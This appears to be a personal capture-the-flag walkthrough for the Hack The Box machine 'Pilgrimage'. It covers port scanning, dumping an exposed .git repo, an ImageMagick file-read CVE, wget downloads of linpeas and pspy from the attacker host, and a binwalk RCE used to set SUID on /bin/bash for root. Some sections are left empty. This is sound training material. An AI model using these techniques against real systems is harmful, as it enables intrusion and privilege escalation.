 ping machine
	- `ping ###.###.###.###`
```bash
 ✘ kali@kali  ~/htb  ping 10.10.11.219
PING 10.10.11.219 (10.10.11.219) 56(84) bytes of data.
64 bytes from 10.10.11.219: icmp_seq=1 ttl=63 time=54.8 ms
64 bytes from 10.10.11.219: icmp_seq=2 ttl=63 time=52.8 ms
64 bytes from 10.10.11.219: icmp_seq=3 ttl=63 time=50.5 ms
64 bytes from 10.10.11.219: icmp_seq=4 ttl=63 time=53.2 ms
^C
--- 10.10.11.219 ping statistics ---
4 packets transmitted, 4 received, 0% packet loss, time 3002ms
rtt min/avg/max/mdev = 50.504/52.843/54.787/1.534 ms

```
- nmap for open ports
	- `nmap -p- -T4 --open -Pn -vvv ###.###.###.### -oN nameNmap.txt`
	- or ''
```bash
 ✘ kali@kali  ~/htb  nmap -p- -T4 --open -Pn -vvv 10.10.11.219 -oN pilgrimageNma
p.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 10:50 EST
Initiating Parallel DNS resolution of 1 host. at 10:50
Completed Parallel DNS resolution of 1 host. at 10:50, 0.02s elapsed
DNS resolution of 1 IPs took 0.02s. Mode: Async [#: 2, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 10:50
Scanning 10.10.11.219 [65535 ports]
Discovered open port 80/tcp on 10.10.11.219
Discovered open port 22/tcp on 10.10.11.219
Completed SYN Stealth Scan at 10:51, 18.21s elapsed (65535 total ports)
Nmap scan report for 10.10.11.219
Host is up, received user-set (0.11s latency).
Scanned at 2025-01-25 10:50:50 EST for 18s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 18.36 seconds
           Raw packets sent: 66593 (2.930MB) | Rcvd: 65665 (2.627MB)

```

- nmap for services and versions running on open ports
	- `nmap -p port#, port#, port# -sC -sV ###.###.###.### -oN nameServicesVersionsNmap.txt`
```bash
 kali@kali  ~/htb  nmap -p 22,80 -sC -sV 10.10.11.219 -oN PilgrimageServicesVers
ionsNmap.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-25 10:52 EST
Nmap scan report for 10.10.11.219
Host is up (0.080s latency).
219
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://pilgrimage.htb/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.96 seconds

```

- navigating to ip address at port 80 does not resolve
- adding ip and domain to /etc/hosts solves this problem
```bash
 kali@kali  ~  cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
::1             localhost ip6-localhost ip6-loopback
ff02::1         ip6-allnodes
ff02::2         ip6-allrouters
10.10.11.221    2million.htb edge-eu-free-1.2million.htb
10.10.11.189    precious.htb
10.10.10.84     poison.htb
10.10.11.227    tickets.keeper.htb keeper.htb
10.10.11.219    pilgrimage.htb

```

- running nmap again reveals an exposed .git repo
```bash
 ✘ kali@kali  ~/htb/pilgrimage  nmap -p 22,80 -sC -sV 10.10.11.219 -oN nameServicesVersionsNmap2.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-01-30 17:17 EST
Nmap scan report for pilgrimage.htb (10.10.11.219)
Host is up (0.073s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)
|   256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)
|_  256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)
80/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-git: 
|   10.10.11.219:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|_    Last commit message: Pilgrimage image shrinking service initial commit. # Please ...
|_http-title: Pilgrimage - Shrink Your Images
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.60 seconds

```

- gitdumper exfils exposed github repos
- [Gitdumper](https://github.com/arthaud/git-dumper)
- `git-dumper http://pilgrimage.htb pilGitDump `
```bash
 kali@kali  ~/htb/pilgrimage/pilvenv/pilvenv/pilGitDump   master  ll           
total 27M
drwxrwxr-x 6 kali kali 4.0K Jan 25 15:08 assets
-rwxrwxr-x 1 kali kali 5.5K Jan 25 15:08 dashboard.php
-rwxrwxr-x 1 kali kali 9.1K Jan 25 15:08 index.php
-rwxrwxr-x 1 kali kali 6.7K Jan 25 15:08 login.php
-rwxrwxr-x 1 kali kali   98 Jan 25 15:08 logout.php
-rwxrwxr-x 1 kali kali  27M Jan 25 15:08 magick
-rwxrwxr-x 1 kali kali 6.7K Jan 25 15:08 register.php
drwxrwxr-x 4 kali kali 4.0K Jan 25 15:08 vendor
 kali@kali  ~/htb/pilgrimage/pilvenv/pilvenv/pilGitDump   master  

```

- - searching login.php from the git dump
```bash
./login.php:  $db = new PDO('sqlite:/var/db/pilgrimage');
./login.php:  $stmt = $db->prepare("SELECT * FROM users WHERE username = ? and password = ?");
./index.php:        $db = new PDO('sqlite:/var/db/pilgrimage');
./index.php:        $stmt = $db->prepare("INSERT INTO `images` (url,original,username) VALUES (?,?,?)");
grep: ./magick: binary file matches
 kali@kali  ~/htb/pilgrimage/pilvenv/pilvenv/pilGitDump   master  grep -r db ./

```


- .git repo has a folder for magick which is responsible for the image shrinker
```bash
 ✘ kali@kali  ~/htb/pilgrimage/pilvenv/pilvenv/pilGitDump   master  ./magick --version
Version: ImageMagick 7.1.0-49 beta Q16-HDRI x86_64 c243c9281:20220911 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype jbig jng jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (7.5)

```

- searchsploit yields arbitrary file read vulnerability for magick
```bash
 kali@kali  ~/htb/pilgrimage  searchsploit magick
---------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                      |  Path
---------------------------------------------------------------------------------------------------- ---------------------------------
Automagick Tube Script 1.4.4 - 'module' Cross-Site Scripting                                        | php/webapps/35645.txt
GeekLog 2.x - 'ImageImageMagick.php' Remote File Inclusion                                          | php/webapps/3946.txt
GraphicsMagick - Memory Disclosure / Heap Overflow                                                  | multiple/dos/43111.py
ImageMagick - Memory Leak                                                                           | multiple/local/45890.sh
ImageMagick 6.8.8-4 - Local Buffer Overflow (SEH)                                                   | windows/local/31688.pl
ImageMagick 6.9.3-9 / 7.0.1-0 - 'ImageTragick' Delegate Arbitrary Command Execution (Metasploit)    | multiple/local/39791.rb
ImageMagick 6.x - '.PNM' Image Decoding Remote Buffer Overflow                                      | linux/dos/25527.txt
ImageMagick 6.x - '.SGI' Image File Remote Heap Buffer Overflow                                     | linux/dos/28383.txt
ImageMagick 7.0.1-0 / 6.9.3-9 - 'ImageTragick ' Multiple Vulnerabilities                            | multiple/dos/39767.txt
ImageMagick 7.1.0-49 - Arbitrary File Read                                                          | multiple/local/51261.txt
ImageMagick 7.1.0-49 - DoS                                                                          | php/dos/51256.txt
Imagick 3.3.0 (PHP 5.4) - disable_functions Bypass                                                  | php/webapps/39766.php
Wordpress Plugin ImageMagick-Engine 1.7.4 - Remote Code Execution (RCE) (Authenticated)             | php/webapps/51025.txt
---------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

- Searching github for magick POC
- https://github.com/voidz0r/CVE-2022-44268?tab=readme-ov-file
- Clone the project
- `git clone https://github.com/voidz0r/CVE-2022-44268`
- Run the project
- `cargo run "/var/db/pilgrimage"`
- Use the file at pilgrimage.htb
- download converted file `cursed.png`
- Analyze the resized image
- `identify -verbose cursed.png`
- Convert hex to str
- 
- 
```bash

```

- search local directory
```bash
emily@pilgrimage:~$ ls -aslp
total 36
4 drwxr-xr-x 4 emily emily 4096 Jun  8  2023 ./
4 drwxr-xr-x 3 root  root  4096 Jun  8  2023 ../
0 lrwxrwxrwx 1 emily emily    9 Feb 10  2023 .bash_history -> /dev/null
4 -rw-r--r-- 1 emily emily  220 Feb 10  2023 .bash_logout
4 -rw-r--r-- 1 emily emily 3526 Feb 10  2023 .bashrc
4 drwxr-xr-x 3 emily emily 4096 Jun  8  2023 .config/
4 -rw-r--r-- 1 emily emily   44 Jun  1  2023 .gitconfig
4 drwxr-xr-x 3 emily emily 4096 Jun  8  2023 .local/
4 -rw-r--r-- 1 emily emily  807 Feb 10  2023 .profile
4 -rw-r----- 1 root  emily   33 Feb  1 23:55 user.txt

```
- search root directory
```bash
emily@pilgrimage:~$ cd /root
-bash: cd: /root: Permission denied
```
- sudo -l
	- em
```bash
emily@pilgrimage:~$ sudo -l
[sudo] password for emily: 
Sorry, user emily may not run sudo on pilgrimage.

```
- look for exploitable binary's
	- `$ find / -perm /4000 2>/dev/null'
```bash
emily@pilgrimage:~$ find / -perm /4000 2>/dev/null
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/mount
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/umount

```

- download linpeas on attack box if you don't have it already
- ` ✘ kali@kali  ~  sudo apt install peass`
- navigate to /usr/share/peass/linpeas
- spin up python server on attack machine
- `python3 -m http.server`
- pull down linpeas to target machine from attack machine 
```bash
emily@pilgrimage:~$ wget http://10.10.16.12/linpeas.sh                                                                                
--2025-01-31 10:11:11--  http://10.10.16.12/linpeas.sh
Connecting to 10.10.16.12:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 830426 (811K) [text/x-sh] 
Saving to: ‘linpeas.sh’

linpeas.sh                        100%[===========================================================>] 810.96K  1.03MB/s    in 0.8s    

2025-01-31 10:11:12 (1.03 MB/s) - ‘linpeas.sh’ saved [830426/830426]

```
- run linpeas on victim
	- look for red and yellow/red items
	- but found nothing
```bash
$ emily@pilgrimage:~$ /bin/bash linpeas.sh
```

- download pspy on attackbox if you don't have it already
- [pspy - unprivileged Linux process snooping](https://github.com/DominicBreuker/pspy?tab=readme-ov-file)
- I had to download `64 bit big, static version: pspy64` from the website 
- then copy from downloads to `/usr/share`
- navigate to `/usr/share` and 
- spin up python server on attack machine `python3 -m http.server`
- pull down pspy to target 
```bash
emily@pilgrimage:/tmp$ wget http://10.10.16.12/pspy64                                                                                 
--2025-01-31 10:46:16--  http://10.10.16.12/pspy64                                                                                    
Connecting to 10.10.16.12:80... connected.                                                                                            
HTTP request sent, awaiting response... 200 OK                                                                                        
Length: 3104768 (3.0M) [application/octet-stream]                                                                                     
Saving to: ‘pspy64’                                                                                                                   

pspy64                            100%[===========================================================>]   2.96M  1006KB/s    in 3.0s     

2025-01-31 10:46:20 (1006 KB/s) - ‘pspy64’ saved [3104768/3104768]

```
- run pspy on target machine 
	- look for processes running as root with a UID=0 
	- malwarescan.sh looks interesting
	- `2025/01/31 10:47:08 CMD: UID=0     PID=768    | /bin/bash /usr/sbin/malwarescan.sh `
- navigating to /bin/bash /usr/sbin/malwarescan.sh  
	- reveals inotifywait running something called binwalk
```bash
emily@pilgrimage:~$ cat /usr/sbin/malwarescan.sh                          
#!/bin/bash                                                                                                                         
blacklist=("Executable script" "Microsoft executable")

/usr/bin/inotifywait -m -e create /var/www/pilgrimage.htb/shrunk/ | while read FILE; do
        filename="/var/www/pilgrimage.htb/shrunk/$(/usr/bin/echo "$FILE" | /usr/bin/tail -n 1 | /usr/bin/sed -n -e 's/^.*CREATE //p')"
        binout="$(/usr/local/bin/binwalk -e "$filename")"
        for banned in "${blacklist[@]}"; do
                if [[ "$binout" == *"$banned"* ]]; then
                        /usr/bin/rm "$filename"
                        break
                fi
        done
done

```
- running binwalk reveals version 2.3.2
```bash
emily@pilgrimage:~$ binwalk                                               
Binwalk v2.3.2                                                                                                                        
Craig Heffner, ReFirmLabs                                                                                                             
https://github.com/ReFirmLabs/binwalk
```
- searching for binwalk vulnerabilities
	- [Binwalk v2.3.2 - Remote Command Execution (RCE) ](https://www.exploit-db.com/exploits/51249)
	- [CVE-2022-4510-WalkingPath](https://github.com/adhikara13/CVE-2022-4510-WalkingPath) 
- Using walking path to create command 'chmod u+s /bin/bash'
- apply suid to bash, 
- then watch -n 1.0 ls -ld /bin/bash, 
- then run bash -p when permissions change




- Gobuster to enumerate website if machine has 80 or 443
	- `gobuster dir -u http://precious.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt -o nameGobuster.txt -t 10`
```bash

```
- -or-
- ffuf to enumerate website if machine has 80 or 443
	- ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.10/FUZZ
	- wordlist 3 million?
```bash

```




- search for exploits, RCEs, etc on service's versions running on those open ports
	- SearchSploit
	- Metaspolit
	- document

- Foothold
	- sudo -l